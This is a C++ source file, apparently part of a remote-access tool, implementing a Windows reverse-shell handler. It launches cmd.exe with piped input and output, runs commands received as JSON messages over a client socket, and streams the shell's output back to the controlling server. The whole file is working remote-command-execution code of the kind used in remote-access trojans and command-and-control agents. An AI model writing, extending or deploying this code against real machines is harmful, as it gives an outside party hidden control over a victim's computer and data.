#include "ReverseShell.h"

// TODO UTF8 compatibility

void ReverseShell::initializeCMDProcess() {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, true };
    CreatePipe(&hRead, &hWriteCmd, &sa, 0);
    CreatePipe(&hReadCmd, &hWrite, &sa, 0);

    STARTUPINFOW si = { 0 };
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdInput = hRead;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.dwFlags = STARTF_USESTDHANDLES;

    wchar_t cmd[] = L"cmd.exe";
    CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}

void ReverseShell::runCommand(nlohmann::json jsonObject) {
        std::string command = jsonObject["command"];
        command.append("\n");
        DWORD written;
        WriteFile(hWriteCmd, command.c_str(), command.size(), &written, NULL);
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
}

void ReverseShell::closeCMDProcess() {
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    CloseHandle(hWrite);
    CloseHandle(hReadCmd);
    CloseHandle(hWriteCmd);
}

void ReverseShell::readOutput() {
    const int BUFFER_SIZE = 4096;
    char buffer[BUFFER_SIZE];
    std::string accumulatedOutput;

    while (isShellOpen.load()) {
        DWORD bytesRead;

        if (PeekNamedPipe(hReadCmd, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0) {
            if (ReadFile(hReadCmd, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
                buffer[bytesRead] = '\0';
                accumulatedOutput += buffer;
            }
        } else {
            if (!accumulatedOutput.empty()) {
                nlohmann::json jsonObject;
                jsonObject["RESPONSE"] = "SHELL";
                jsonObject["result"] = accumulatedOutput;
                clientSocket.sendMessage(jsonObject);
                accumulatedOutput.clear();
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
}


ReverseShell::ReverseShell(ClientSocket &clientSocket) : Handler(clientSocket){
    ActionMap& actionMap = clientSocket.getActionMap();
    actionMap["REVERSE_SHELL_COMMAND"]  = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &ReverseShell::runCommand, json);
    };
    actionMap["START_REVERSE_SHELL"]  = [&](nlohmann::json& json) {
        if (!isShellOpen.load()) {
            isShellOpen.store(true);
            initializeCMDProcess();
            threadGen.runInNewThread(this, &ReverseShell::readOutput);
        }
    };
    actionMap["CLOSE_REVERSE_SHELL"]  = [&](nlohmann::json& json) {
        isShellOpen.store(false);
        closeCMDProcess();
    };



}